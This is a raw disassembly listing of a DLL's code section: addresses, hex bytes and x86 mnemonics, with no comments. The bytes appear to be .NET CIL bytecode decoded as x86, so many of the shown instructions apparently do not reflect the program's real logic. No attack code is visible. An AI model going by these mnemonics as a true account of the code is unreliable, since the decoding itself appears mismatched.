10003655:	01 28                	add    %ebp,(%eax)
10003657:	48                   	dec    %eax
10003658:	00 00                	add    %al,(%eax)
1000365a:	0a 59 12             	or     0x12(%ecx),%bl
1000365d:	00 28                	add    %ch,(%eax)
1000365f:	4a                   	dec    %edx
10003660:	00 00                	add    %al,(%eax)
10003662:	0a 18                	or     (%eax),%bl
10003664:	5b                   	pop    %ebx
10003665:	58                   	pop    %eax
10003666:	0c 7e                	or     $0x7e,%al
10003668:	12 00                	adc    (%eax),%al
1000366a:	00 04 17             	add    %al,(%edi,%edx,1)
1000366d:	33 66 02             	xor    0x2(%esi),%esp
10003670:	7b 1c                	jnp    0x1000368e
10003672:	00 00                	add    %al,(%eax)
10003674:	04 1f                	add    $0x1f,%al
10003676:	63 2f                	arpl   %ebp,(%edi)
10003678:	1d 02 7b 1e 00       	sbb    $0x1e7b02,%eax
1000367d:	00 04 02             	add    %al,(%edx,%eax,1)
10003680:	7b 1f                	jnp    0x100036a1
10003682:	00 00                	add    %al,(%eax)
10003684:	04 5d                	add    $0x5d,%al
10003686:	2d 0e 02 25 7b       	sub    $0x7b25020e,%eax
1000368b:	1c 00                	sbb    $0x0,%al
1000368d:	00 04 17             	add    %al,(%edi,%edx,1)
10003690:	58                   	pop    %eax
10003691:	7d 1c                	jge    0x100036af
10003693:	00 00                	add    %al,(%eax)
10003695:	04 02                	add    $0x2,%al
10003697:	7b 1a                	jnp    0x100036b3
10003699:	00 00                	add    %al,(%eax)
1000369b:	04 02                	add    $0x2,%al
1000369d:	7b 1c                	jnp    0x100036bb
1000369f:	00 00                	add    %al,(%eax)
100036a1:	04 8c                	add    $0x8c,%al
100036a3:	15 00 00 01 72       	adc    $0x72010000,%eax
100036a8:	91                   	xchg   %eax,%ecx
100036a9:	01 00                	add    %eax,(%eax)
100036ab:	70 28                	jo     0x100036d5
100036ad:	34 00                	xor    $0x0,%al
100036af:	00 0a                	add    %cl,(%edx)
100036b1:	6f                   	outsl  %ds:(%esi),(%dx)
100036b2:	35 00 00 0a 02       	xor    $0x20a0000,%eax
100036b7:	7b 1a                	jnp    0x100036d3
100036b9:	00 00                	add    %al,(%eax)
100036bb:	04 08                	add    $0x8,%al
100036bd:	02 7b 1a             	add    0x1a(%ebx),%bh
100036c0:	00 00                	add    %al,(%eax)
100036c2:	04 6f                	add    $0x6f,%al
100036c4:	24 00                	and    $0x0,%al
100036c6:	00 0a                	add    %cl,(%edx)
100036c8:	18 5b 59             	sbb    %bl,0x59(%ebx)
100036cb:	6f                   	outsl  %ds:(%esi),(%dx)
100036cc:	4c                   	dec    %esp
100036cd:	00 00                	add    %al,(%eax)
100036cf:	0a 38                	or     (%eax),%bh
100036d1:	a2 00 00 00 7e       	mov    %al,0x7e000000
100036d6:	12 00                	adc    (%eax),%al
100036d8:	00 04 19             	add    %al,(%ecx,%ebx,1)
100036db:	33 4b 02             	xor    0x2(%ebx),%ecx
100036de:	7b 1c                	jnp    0x100036fc
100036e0:	00 00                	add    %al,(%eax)
100036e2:	04 1f                	add    $0x1f,%al
100036e4:	63 2f                	arpl   %ebp,(%edi)
100036e6:	1f                   	pop    %ds
100036e7:	02 7b 1e             	add    0x1e(%ebx),%bh
100036ea:	00 00                	add    %al,(%eax)
100036ec:	04 02                	add    $0x2,%al
100036ee:	7b 1f                	jnp    0x1000370f
100036f0:	00 00                	add    %al,(%eax)
100036f2:	04 18                	add    $0x18,%al
100036f4:	5b                   	pop    %ebx
100036f5:	5d                   	pop    %ebp
100036f6:	2d 0e 02 25 7b       	sub    $0x7b25020e,%eax
100036fb:	1c 00                	sbb    $0x0,%al
100036fd:	00 04 17             	add    %al,(%edi,%edx,1)
10003700:	58                   	pop    %eax
10003701:	7d 1c                	jge    0x1000371f
10003703:	00 00                	add    %al,(%eax)
10003705:	04 02                	add    $0x2,%al
10003707:	7b 1b                	jnp    0x10003724
10003709:	00 00                	add    %al,(%eax)
1000370b:	04 02                	add    $0x2,%al
1000370d:	7b 1c                	jnp    0x1000372b
1000370f:	00 00                	add    %al,(%eax)
10003711:	04 8c                	add    $0x8c,%al
10003713:	15 00 00 01 72       	adc    $0x72010000,%eax
10003718:	91                   	xchg   %eax,%ecx
10003719:	01 00                	add    %eax,(%eax)
1000371b:	70 28                	jo     0x10003745
1000371d:	34 00                	xor    $0x0,%al
1000371f:	00 0a                	add    %cl,(%edx)
10003721:	6f                   	outsl  %ds:(%esi),(%dx)
10003722:	35 00 00 0a 2b       	xor    $0x2b0a0000,%eax
10003727:	4f                   	dec    %edi
10003728:	7e 12                	jle    0x1000373c
1000372a:	00 00                	add    %al,(%eax)
1000372c:	04 1a                	add    $0x1a,%al
1000372e:	33 47 02             	xor    0x2(%edi),%eax
10003731:	7b 1c                	jnp    0x1000374f
10003733:	00 00                	add    %al,(%eax)
10003735:	04 1f                	add    $0x1f,%al
10003737:	63 2f                	arpl   %ebp,(%edi)
10003739:	1d 02 7b 1e 00       	sbb    $0x1e7b02,%eax
1000373e:	00 04 02             	add    %al,(%edx,%eax,1)
10003741:	7b 1f                	jnp    0x10003762
10003743:	00 00                	add    %al,(%eax)
10003745:	04 5d                	add    $0x5d,%al
10003747:	2d 0e 02 25 7b       	sub    $0x7b25020e,%eax
1000374c:	1c 00                	sbb    $0x0,%al
1000374e:	00 04 17             	add    %al,(%edi,%edx,1)
10003751:	58                   	pop    %eax
10003752:	7d 1c                	jge    0x10003770
10003754:	00 00                	add    %al,(%eax)
10003756:	04 02                	add    $0x2,%al
10003758:	7b 1a                	jnp    0x10003774
1000375a:	00 00                	add    %al,(%eax)
1000375c:	04 02                	add    $0x2,%al
1000375e:	7b 1c                	jnp    0x1000377c
10003760:	00 00                	add    %al,(%eax)
10003762:	04 8c                	add    $0x8c,%al
10003764:	15 00 00 01 72       	adc    $0x72010000,%eax
10003769:	a9 01 00 70 28       	test   $0x28700001,%eax
1000376e:	34 00                	xor    $0x0,%al
10003770:	00 0a                	add    %cl,(%edx)
10003772:	6f                   	outsl  %ds:(%esi),(%dx)
10003773:	35 00 00 0a 7e       	xor    $0x7e0a0000,%eax
10003778:	0e                   	push   %cs
10003779:	00 00                	add    %al,(%eax)
1000377b:	04 17                	add    $0x17,%al
1000377d:	6f                   	outsl  %ds:(%esi),(%dx)
1000377e:	36 00 00             	add    %al,%ss:(%eax)
10003781:	0a 7e 0e             	or     0xe(%esi),%bh
10003784:	00 00                	add    %al,(%eax)
10003786:	04 6f                	add    $0x6f,%al
10003788:	37                   	aaa
10003789:	00 00                	add    %al,(%eax)
1000378b:	0a 28                	or     (%eax),%ch
1000378d:	37                   	aaa
1000378e:	00 00                	add    %al,(%eax)
10003790:	06                   	push   %es
10003791:	de 03                	fiadds (%ebx)
10003793:	26 de 00             	fiadds %es:(%eax)
10003796:	2a 00                	sub    (%eax),%al
10003798:	41                   	inc    %ecx
10003799:	1c 00                	sbb    $0x0,%al
	...
100037a3:	00 a7 01 00 00 a7    	add    %ah,-0x58ffffff(%edi)
100037a9:	01 00                	add    %eax,(%eax)
100037ab:	00 03                	add    %al,(%ebx)
100037ad:	00 00                	add    %al,(%eax)
100037af:	00 01                	add    %al,(%ecx)
100037b1:	00 00                	add    %al,(%eax)
100037b3:	01 0b                	add    %ecx,(%ebx)
100037b5:	30 01                	xor    %al,(%ecx)
100037b7:	00 15 00 00 00 00    	add    %dl,0x0
100037bd:	00 00                	add    %al,(%eax)
100037bf:	00 7e 0e             	add    %bh,0xe(%esi)
100037c2:	00 00                	add    %al,(%eax)
100037c4:	04 6f                	add    $0x6f,%al
100037c6:	37                   	aaa
100037c7:	00 00                	add    %al,(%eax)
100037c9:	0a 28                	or     (%eax),%ch
100037cb:	37                   	aaa
100037cc:	00 00                	add    %al,(%eax)
100037ce:	06                   	push   %es
100037cf:	de 03                	fiadds (%ebx)
100037d1:	26 de 00             	fiadds %es:(%eax)
100037d4:	2a 00                	sub    (%eax),%al
100037d6:	00 00                	add    %al,(%eax)
100037d8:	01 10                	add    %edx,(%eax)
100037da:	00 00                	add    %al,(%eax)
100037dc:	00 00                	add    %al,(%eax)
100037de:	00 00                	add    %al,(%eax)
100037e0:	11 11                	adc    %edx,(%ecx)
100037e2:	00 03                	add    %al,(%ebx)
100037e4:	01 00                	add    %eax,(%eax)
100037e6:	00 01                	add    %al,(%ecx)
100037e8:	1b 30                	sbb    (%eax),%esi
100037ea:	07                   	pop    %es
100037eb:	00 99 1d 00 00 0f    	add    %bl,0xf00001d(%ecx)
100037f1:	00 00                	add    %al,(%eax)
100037f3:	11 14 13             	adc    %edx,(%ebx,%edx,1)
100037f6:	36 14 13             	ss adc $0x13,%al
100037f9:	37                   	aaa
100037fa:	73 40                	jae    0x1000383c
100037fc:	00 00                	add    %al,(%eax)
100037fe:	06                   	push   %es
100037ff:	13 38                	adc    (%eax),%edi
10003801:	28 47 00             	sub    %al,0x0(%edi)
10003804:	00 0a                	add    %cl,(%edx)
10003806:	0a 28                	or     (%eax),%ch
10003808:	45                   	inc    %ebp
10003809:	00 00                	add    %al,(%eax)
1000380b:	0a 6f 46             	or     0x46(%edi),%ch
1000380e:	00 00                	add    %al,(%eax)
10003810:	0a 0b                	or     (%ebx),%cl
10003812:	12 01                	adc    (%ecx),%al
10003814:	28 48 00             	sub    %cl,0x0(%eax)
10003817:	00 0a                	add    %cl,(%edx)
10003819:	12 00                	adc    (%eax),%al
1000381b:	28 48 00             	sub    %cl,0x0(%eax)
1000381e:	00 0a                	add    %cl,(%edx)
10003820:	59                   	pop    %ecx
10003821:	0c 12                	or     $0x12,%al
10003823:	01 28                	add    %ebp,(%eax)
10003825:	49                   	dec    %ecx
10003826:	00 00                	add    %al,(%eax)
10003828:	0a 12                	or     (%edx),%dl
1000382a:	00 28                	add    %ch,(%eax)
1000382c:	49                   	dec    %ecx
1000382d:	00 00                	add    %al,(%eax)
1000382f:	0a 59 0d             	or     0xd(%ecx),%bl
10003832:	12 01                	adc    (%ecx),%al
10003834:	28 4a 00             	sub    %cl,0x0(%edx)
10003837:	00 0a                	add    %cl,(%edx)
10003839:	18 5b 26             	sbb    %bl,0x26(%ebx)
1000383c:	12 01                	adc    (%ecx),%al
1000383e:	28 4b 00             	sub    %cl,0x0(%ebx)
10003841:	00 0a                	add    %cl,(%edx)
10003843:	18 5b 26             	sbb    %bl,0x26(%ebx)
10003846:	73 4f                	jae    0x10003897
10003848:	00 00                	add    %al,(%eax)
1000384a:	0a 80 0e 00 00 04    	or     0x400000e(%eax),%al
10003850:	7e 0e                	jle    0x10003860
10003852:	00 00                	add    %al,(%eax)
10003854:	04 16                	add    $0x16,%al
10003856:	6f                   	outsl  %ds:(%esi),(%dx)
10003857:	50                   	push   %eax
10003858:	00 00                	add    %al,(%eax)
1000385a:	0a 7e 0e             	or     0xe(%esi),%bh
1000385d:	00 00                	add    %al,(%eax)
1000385f:	04 16                	add    $0x16,%al
10003861:	6f                   	outsl  %ds:(%esi),(%dx)
10003862:	51                   	push   %ecx
10003863:	00 00                	add    %al,(%eax)
10003865:	0a 7e 0e             	or     0xe(%esi),%bh
10003868:	00 00                	add    %al,(%eax)
1000386a:	04 12                	add    $0x12,%al
1000386c:	00 28                	add    %ch,(%eax)
1000386e:	48                   	dec    %eax
1000386f:	00 00                	add    %al,(%eax)
10003871:	0a 12                	or     (%edx),%dl
10003873:	00 28                	add    %ch,(%eax)
10003875:	49                   	dec    %ecx
10003876:	00 00                	add    %al,(%eax)
10003878:	0a 73 52             	or     0x52(%ebx),%dh
1000387b:	00 00                	add    %al,(%eax)
1000387d:	0a 6f 53             	or     0x53(%edi),%ch
10003880:	00 00                	add    %al,(%eax)
10003882:	0a 7e 0e             	or     0xe(%esi),%bh
10003885:	00 00                	add    %al,(%eax)
10003887:	04 12                	add    $0x12,%al
10003889:	00 28                	add    %ch,(%eax)
1000388b:	4a                   	dec    %edx
1000388c:	00 00                	add    %al,(%eax)
1000388e:	0a 12                	or     (%edx),%dl
10003890:	00 28                	add    %ch,(%eax)
10003892:	4b                   	dec    %ebx
10003893:	00 00                	add    %al,(%eax)
10003895:	0a 73 54             	or     0x54(%ebx),%dh
10003898:	00 00                	add    %al,(%eax)
1000389a:	0a 6f 55             	or     0x55(%edi),%ch
1000389d:	00 00                	add    %al,(%eax)
1000389f:	0a 7e 0e             	or     0xe(%esi),%bh
100038a2:	00 00                	add    %al,(%eax)
100038a4:	04 17                	add    $0x17,%al
100038a6:	6f                   	outsl  %ds:(%esi),(%dx)
100038a7:	36 00 00             	add    %al,%ss:(%eax)
100038aa:	0a 7e 0e             	or     0xe(%esi),%bh
100038ad:	00 00                	add    %al,(%eax)
100038af:	04 16                	add    $0x16,%al
100038b1:	6f                   	outsl  %ds:(%esi),(%dx)
100038b2:	56                   	push   %esi
100038b3:	00 00                	add    %al,(%eax)
100038b5:	0a 7e 0e             	or     0xe(%esi),%bh
100038b8:	00 00                	add    %al,(%eax)
100038ba:	04 16                	add    $0x16,%al
100038bc:	1f                   	pop    %ds
100038bd:	78 20                	js     0x100038df
100038bf:	d7                   	xlat   %ds:(%ebx)
100038c0:	00 00                	add    %al,(%eax)
100038c2:	00 28                	add    %ch,(%eax)
100038c4:	39 00                	cmp    %eax,(%eax)
100038c6:	00 0a                	add    %cl,(%edx)
100038c8:	6f                   	outsl  %ds:(%esi),(%dx)
100038c9:	3a 00                	cmp    (%eax),%al
100038cb:	00 0a                	add    %cl,(%edx)
100038cd:	11 38                	adc    %edi,(%eax)
100038cf:	73 57                	jae    0x10003928
100038d1:	00 00                	add    %al,(%eax)
100038d3:	0a 7d 18             	or     0x18(%ebp),%bh
100038d6:	00 00                	add    %al,(%eax)
100038d8:	04 11                	add    $0x11,%al
100038da:	38 73 58             	cmp    %dh,0x58(%ebx)
100038dd:	00 00                	add    %al,(%eax)
100038df:	0a 7d 19             	or     0x19(%ebp),%bh
100038e2:	00 00                	add    %al,(%eax)
100038e4:	04 11                	add    $0x11,%al
100038e6:	38 73 58             	cmp    %dh,0x58(%ebx)
100038e9:	00 00                	add    %al,(%eax)
100038eb:	0a 7d 1a             	or     0x1a(%ebp),%bh
100038ee:	00 00                	add    %al,(%eax)
100038f0:	04 11                	add    $0x11,%al
100038f2:	38 73 58             	cmp    %dh,0x58(%ebx)
100038f5:	00 00                	add    %al,(%eax)
100038f7:	0a 7d 1b             	or     0x1b(%ebp),%bh
100038fa:	00 00                	add    %al,(%eax)
100038fc:	04 11                	add    $0x11,%al
100038fe:	38 16                	cmp    %dl,(%esi)
10003900:	7d 1c                	jge    0x1000391e
10003902:	00 00                	add    %al,(%eax)
10003904:	04 11                	add    $0x11,%al
10003906:	38 23                	cmp    %ah,(%ebx)
	...
10003910:	7d 1d                	jge    0x1000392f
10003912:	00 00                	add    %al,(%eax)
10003914:	04 73                	add    $0x73,%al
10003916:	45                   	inc    %ebp
10003917:	00 00                	add    %al,(%eax)
10003919:	06                   	push   %es
1000391a:	13 34 11             	adc    (%ecx,%edx,1),%esi
1000391d:	34 11                	xor    $0x11,%al
1000391f:	38 7d 20             	cmp    %bh,0x20(%ebp)
10003922:	00 00                	add    %al,(%eax)
10003924:	04 7e                	add    $0x7e,%al
10003926:	12 00                	adc    (%eax),%al
10003928:	00 04 13             	add    %al,(%ebx,%edx,1)
1000392b:	39 11                	cmp    %edx,(%ecx)
1000392d:	39 17                	cmp    %edx,(%edi)
1000392f:	59                   	pop    %ecx
10003930:	45                   	inc    %ebp
10003931:	0f 00 00             	sldt   (%eax)
10003934:	00 05 00 00 00 d1    	add    %al,0xd1000000
1000393a:	01 00                	add    %eax,(%eax)
1000393c:	00 2c 03             	add    %ch,(%ebx,%eax,1)
1000393f:	00 00                	add    %al,(%eax)
10003941:	9b                   	fwait
10003942:	04 00                	add    $0x0,%al
10003944:	00 02                	add    %al,(%edx)
10003946:	06                   	push   %es
10003947:	00 00                	add    %al,(%eax)
10003949:	16                   	push   %ss
1000394a:	06                   	push   %es
1000394b:	00 00                	add    %al,(%eax)
1000394d:	16                   	push   %ss
1000394e:	06                   	push   %es
1000394f:	00 00                	add    %al,(%eax)
10003951:	16                   	push   %ss
10003952:	06                   	push   %es
10003953:	00 00                	add    %al,(%eax)
10003955:	16                   	push   %ss
10003956:	06                   	push   %es
10003957:	00 00                	add    %al,(%eax)
10003959:	16                   	push   %ss
1000395a:	06                   	push   %es
1000395b:	00 00                	add    %al,(%eax)
1000395d:	31 0d 00 00 31 0d    	xor    %ecx,0xd310000
10003963:	00 00                	add    %al,(%eax)
10003965:	31 0d 00 00 31 0d    	xor    %ecx,0xd310000
1000396b:	00 00                	add    %al,(%eax)
1000396d:	31 0d 00 00 38 52    	xor    %ecx,0x52380000
10003973:	1b 00                	sbb    (%eax),%eax
10003975:	00 7e 0e             	add    %bh,0xe(%esi)
10003978:	00 00                	add    %al,(%eax)
1000397a:	04 16                	add    $0x16,%al
1000397c:	1f                   	pop    %ds
1000397d:	78 20                	js     0x1000399f
1000397f:	d7                   	xlat   %ds:(%ebx)
10003980:	00 00                	add    %al,(%eax)
10003982:	00 28                	add    %ch,(%eax)
10003984:	39 00                	cmp    %eax,(%eax)
10003986:	00 0a                	add    %cl,(%edx)
10003988:	6f                   	outsl  %ds:(%esi),(%dx)
10003989:	3a 00                	cmp    (%eax),%al
1000398b:	00 0a                	add    %cl,(%edx)
1000398d:	11 38                	adc    %edi,(%eax)
1000398f:	7b 18                	jnp    0x100039a9
10003991:	00 00                	add    %al,(%eax)
10003993:	04 1f                	add    $0x1f,%al
10003995:	64 1f                	fs pop %ds
10003997:	64 73 54             	fs jae 0x100039ee
1000399a:	00 00                	add    %al,(%eax)
1000399c:	0a 6f 59             	or     0x59(%edi),%ch
1000399f:	00 00                	add    %al,(%eax)
100039a1:	0a 11                	or     (%ecx),%dl
100039a3:	38 7b 18             	cmp    %bh,0x18(%ebx)
100039a6:	00 00                	add    %al,(%eax)
100039a8:	04 28                	add    $0x28,%al
100039aa:	5a                   	pop    %edx
100039ab:	00 00                	add    %al,(%eax)
100039ad:	0a 6f 3a             	or     0x3a(%edi),%ch
100039b0:	00 00                	add    %al,(%eax)
100039b2:	0a 11                	or     (%ecx),%dl
100039b4:	38 7b 18             	cmp    %bh,0x18(%ebx)
100039b7:	00 00                	add    %al,(%eax)
100039b9:	04 11                	add    $0x11,%al
100039bb:	36 2d 0f 11 38 fe    	ss sub $0xfe38110f,%eax
100039c1:	06                   	push   %es
100039c2:	41                   	inc    %ecx
100039c3:	00 00                	add    %al,(%eax)
100039c5:	06                   	push   %es
100039c6:	73 5b                	jae    0x10003a23
100039c8:	00 00                	add    %al,(%eax)
100039ca:	0a 13                	or     (%ebx),%dl
100039cc:	36 11 36             	adc    %esi,%ss:(%esi)
100039cf:	6f                   	outsl  %ds:(%esi),(%dx)
100039d0:	5c                   	pop    %esp
100039d1:	00 00                	add    %al,(%eax)
100039d3:	0a 7e 0e             	or     0xe(%esi),%bh
100039d6:	00 00                	add    %al,(%eax)
100039d8:	04 6f                	add    $0x6f,%al
100039da:	5d                   	pop    %ebp
100039db:	00 00                	add    %al,(%eax)
100039dd:	0a 11                	or     (%ecx),%dl
100039df:	38 7b 18             	cmp    %bh,0x18(%ebx)
100039e2:	00 00                	add    %al,(%eax)
100039e4:	04 6f                	add    $0x6f,%al
100039e6:	5e                   	pop    %esi
100039e7:	00 00                	add    %al,(%eax)
100039e9:	0a 11                	or     (%ecx),%dl
100039eb:	38 7b 19             	cmp    %bh,0x19(%ebx)
100039ee:	00 00                	add    %al,(%eax)
100039f0:	04 72                	add    $0x72,%al
100039f2:	c3                   	ret
100039f3:	01 00                	add    %eax,(%eax)
100039f5:	70 6f                	jo     0x10003a66
100039f7:	35 00 00 0a 11       	xor    $0x110a0000,%eax
100039fc:	38 7b 19             	cmp    %bh,0x19(%ebx)
100039ff:	00 00                	add    %al,(%eax)
10003a01:	04 28                	add    $0x28,%al
10003a03:	5f                   	pop    %edi
10003a04:	00 00                	add    %al,(%eax)
10003a06:	0a 6f 3c             	or     0x3c(%edi),%ch
10003a09:	00 00                	add    %al,(%eax)
10003a0b:	0a 11                	or     (%ecx),%dl
10003a0d:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003a10:	00 00                	add    %al,(%eax)
10003a12:	04 72                	add    $0x72,%al
10003a14:	fd                   	std
10003a15:	01 00                	add    %eax,(%eax)
10003a17:	70 22                	jo     0x10003a3b
10003a19:	00 00                	add    %al,(%eax)
10003a1b:	28 42 73             	sub    %al,0x73(%edx)
10003a1e:	60                   	pusha
10003a1f:	00 00                	add    %al,(%eax)
10003a21:	0a 6f 61             	or     0x61(%edi),%ch
10003a24:	00 00                	add    %al,(%eax)
10003a26:	0a 11                	or     (%ecx),%dl
10003a28:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003a2b:	00 00                	add    %al,(%eax)
10003a2d:	04 17                	add    $0x17,%al
10003a2f:	6f                   	outsl  %ds:(%esi),(%dx)
10003a30:	62 00                	bound  %eax,(%eax)
10003a32:	00 0a                	add    %cl,(%edx)
10003a34:	11 38                	adc    %edi,(%eax)
10003a36:	7b 19                	jnp    0x10003a51
10003a38:	00 00                	add    %al,(%eax)
10003a3a:	04 28                	add    $0x28,%al
10003a3c:	5a                   	pop    %edx
10003a3d:	00 00                	add    %al,(%eax)
10003a3f:	0a 6f 3a             	or     0x3a(%edi),%ch
10003a42:	00 00                	add    %al,(%eax)
10003a44:	0a 7e 0e             	or     0xe(%esi),%bh
10003a47:	00 00                	add    %al,(%eax)
10003a49:	04 6f                	add    $0x6f,%al
10003a4b:	5d                   	pop    %ebp
10003a4c:	00 00                	add    %al,(%eax)
10003a4e:	0a 11                	or     (%ecx),%dl
10003a50:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003a53:	00 00                	add    %al,(%eax)
10003a55:	04 6f                	add    $0x6f,%al
10003a57:	5e                   	pop    %esi
10003a58:	00 00                	add    %al,(%eax)
10003a5a:	0a 11                	or     (%ecx),%dl
10003a5c:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003a5f:	00 00                	add    %al,(%eax)
10003a61:	04 72                	add    $0x72,%al
10003a63:	1b 02                	sbb    (%edx),%eax
10003a65:	00 70 6f             	add    %dh,0x6f(%eax)
10003a68:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003a6d:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003a70:	00 00                	add    %al,(%eax)
10003a72:	04 28                	add    $0x28,%al
10003a74:	5f                   	pop    %edi
10003a75:	00 00                	add    %al,(%eax)
10003a77:	0a 6f 3c             	or     0x3c(%edi),%ch
10003a7a:	00 00                	add    %al,(%eax)
10003a7c:	0a 11                	or     (%ecx),%dl
10003a7e:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003a81:	00 00                	add    %al,(%eax)
10003a83:	04 72                	add    $0x72,%al
10003a85:	35 02 00 70 22       	xor    $0x22700002,%eax
10003a8a:	00 00                	add    %al,(%eax)
10003a8c:	c0 41 73 60          	rolb   $0x60,0x73(%ecx)
10003a90:	00 00                	add    %al,(%eax)
10003a92:	0a 6f 61             	or     0x61(%edi),%ch
10003a95:	00 00                	add    %al,(%eax)
10003a97:	0a 11                	or     (%ecx),%dl
10003a99:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003a9c:	00 00                	add    %al,(%eax)
10003a9e:	04 17                	add    $0x17,%al
10003aa0:	6f                   	outsl  %ds:(%esi),(%dx)
10003aa1:	62 00                	bound  %eax,(%eax)
10003aa3:	00 0a                	add    %cl,(%edx)
10003aa5:	11 38                	adc    %edi,(%eax)
10003aa7:	7b 1a                	jnp    0x10003ac3
10003aa9:	00 00                	add    %al,(%eax)
10003aab:	04 28                	add    $0x28,%al
10003aad:	5a                   	pop    %edx
10003aae:	00 00                	add    %al,(%eax)
10003ab0:	0a 6f 3a             	or     0x3a(%edi),%ch
10003ab3:	00 00                	add    %al,(%eax)
10003ab5:	0a 7e 0e             	or     0xe(%esi),%bh
10003ab8:	00 00                	add    %al,(%eax)
10003aba:	04 6f                	add    $0x6f,%al
10003abc:	5d                   	pop    %ebp
10003abd:	00 00                	add    %al,(%eax)
10003abf:	0a 11                	or     (%ecx),%dl
10003ac1:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003ac4:	00 00                	add    %al,(%eax)
10003ac6:	04 6f                	add    $0x6f,%al
10003ac8:	5e                   	pop    %esi
10003ac9:	00 00                	add    %al,(%eax)
10003acb:	0a 11                	or     (%ecx),%dl
10003acd:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003ad0:	00 00                	add    %al,(%eax)
10003ad2:	04 72                	add    $0x72,%al
10003ad4:	47                   	inc    %edi
10003ad5:	02 00                	add    (%eax),%al
10003ad7:	70 6f                	jo     0x10003b48
10003ad9:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003ade:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003ae1:	00 00                	add    %al,(%eax)
10003ae3:	04 28                	add    $0x28,%al
10003ae5:	5f                   	pop    %edi
10003ae6:	00 00                	add    %al,(%eax)
10003ae8:	0a 6f 3c             	or     0x3c(%edi),%ch
10003aeb:	00 00                	add    %al,(%eax)
10003aed:	0a 11                	or     (%ecx),%dl
10003aef:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003af2:	00 00                	add    %al,(%eax)
10003af4:	04 72                	add    $0x72,%al
10003af6:	35 02 00 70 22       	xor    $0x22700002,%eax
10003afb:	00 00                	add    %al,(%eax)
10003afd:	80 41 73 60          	addb   $0x60,0x73(%ecx)
10003b01:	00 00                	add    %al,(%eax)
10003b03:	0a 6f 61             	or     0x61(%edi),%ch
10003b06:	00 00                	add    %al,(%eax)
10003b08:	0a 11                	or     (%ecx),%dl
10003b0a:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003b0d:	00 00                	add    %al,(%eax)
10003b0f:	04 17                	add    $0x17,%al
10003b11:	6f                   	outsl  %ds:(%esi),(%dx)
10003b12:	62 00                	bound  %eax,(%eax)
10003b14:	00 0a                	add    %cl,(%edx)
10003b16:	11 38                	adc    %edi,(%eax)
10003b18:	7b 1b                	jnp    0x10003b35
10003b1a:	00 00                	add    %al,(%eax)
10003b1c:	04 28                	add    $0x28,%al
10003b1e:	5a                   	pop    %edx
10003b1f:	00 00                	add    %al,(%eax)
10003b21:	0a 6f 3a             	or     0x3a(%edi),%ch
10003b24:	00 00                	add    %al,(%eax)
10003b26:	0a 7e 0e             	or     0xe(%esi),%bh
10003b29:	00 00                	add    %al,(%eax)
10003b2b:	04 6f                	add    $0x6f,%al
10003b2d:	5d                   	pop    %ebp
10003b2e:	00 00                	add    %al,(%eax)
10003b30:	0a 11                	or     (%ecx),%dl
10003b32:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003b35:	00 00                	add    %al,(%eax)
10003b37:	04 6f                	add    $0x6f,%al
10003b39:	5e                   	pop    %esi
10003b3a:	00 00                	add    %al,(%eax)
10003b3c:	0a 38                	or     (%eax),%bh
10003b3e:	86 19                	xchg   %bl,(%ecx)
10003b40:	00 00                	add    %al,(%eax)
10003b42:	7e 0e                	jle    0x10003b52
10003b44:	00 00                	add    %al,(%eax)
10003b46:	04 16                	add    $0x16,%al
10003b48:	1f                   	pop    %ds
10003b49:	78 20                	js     0x10003b6b
10003b4b:	d7                   	xlat   %ds:(%ebx)
10003b4c:	00 00                	add    %al,(%eax)
10003b4e:	00 28                	add    %ch,(%eax)
10003b50:	39 00                	cmp    %eax,(%eax)
10003b52:	00 0a                	add    %cl,(%edx)
10003b54:	6f                   	outsl  %ds:(%esi),(%dx)
10003b55:	3a 00                	cmp    (%eax),%al
10003b57:	00 0a                	add    %cl,(%edx)
10003b59:	11 38                	adc    %edi,(%eax)
10003b5b:	7b 18                	jnp    0x10003b75
10003b5d:	00 00                	add    %al,(%eax)
10003b5f:	04 1f                	add    $0x1f,%al
10003b61:	64 1f                	fs pop %ds
10003b63:	64 73 54             	fs jae 0x10003bba
10003b66:	00 00                	add    %al,(%eax)
10003b68:	0a 6f 59             	or     0x59(%edi),%ch
10003b6b:	00 00                	add    %al,(%eax)
10003b6d:	0a 11                	or     (%ecx),%dl
10003b6f:	38 7b 18             	cmp    %bh,0x18(%ebx)
10003b72:	00 00                	add    %al,(%eax)
10003b74:	04 28                	add    $0x28,%al
10003b76:	5a                   	pop    %edx
10003b77:	00 00                	add    %al,(%eax)
10003b79:	0a 6f 3a             	or     0x3a(%edi),%ch
10003b7c:	00 00                	add    %al,(%eax)
10003b7e:	0a 11                	or     (%ecx),%dl
10003b80:	38 7b 18             	cmp    %bh,0x18(%ebx)
10003b83:	00 00                	add    %al,(%eax)
10003b85:	04 11                	add    $0x11,%al
10003b87:	37                   	aaa
10003b88:	2d 0f 11 38 fe       	sub    $0xfe38110f,%eax
10003b8d:	06                   	push   %es
10003b8e:	42                   	inc    %edx
10003b8f:	00 00                	add    %al,(%eax)
10003b91:	06                   	push   %es
10003b92:	73 5b                	jae    0x10003bef
10003b94:	00 00                	add    %al,(%eax)
10003b96:	0a 13                	or     (%ebx),%dl
10003b98:	37                   	aaa
10003b99:	11 37                	adc    %esi,(%edi)
10003b9b:	6f                   	outsl  %ds:(%esi),(%dx)
10003b9c:	5c                   	pop    %esp
10003b9d:	00 00                	add    %al,(%eax)
10003b9f:	0a 7e 0e             	or     0xe(%esi),%bh
10003ba2:	00 00                	add    %al,(%eax)
10003ba4:	04 6f                	add    $0x6f,%al
10003ba6:	5d                   	pop    %ebp
10003ba7:	00 00                	add    %al,(%eax)
10003ba9:	0a 11                	or     (%ecx),%dl
10003bab:	38 7b 18             	cmp    %bh,0x18(%ebx)
10003bae:	00 00                	add    %al,(%eax)
10003bb0:	04 6f                	add    $0x6f,%al
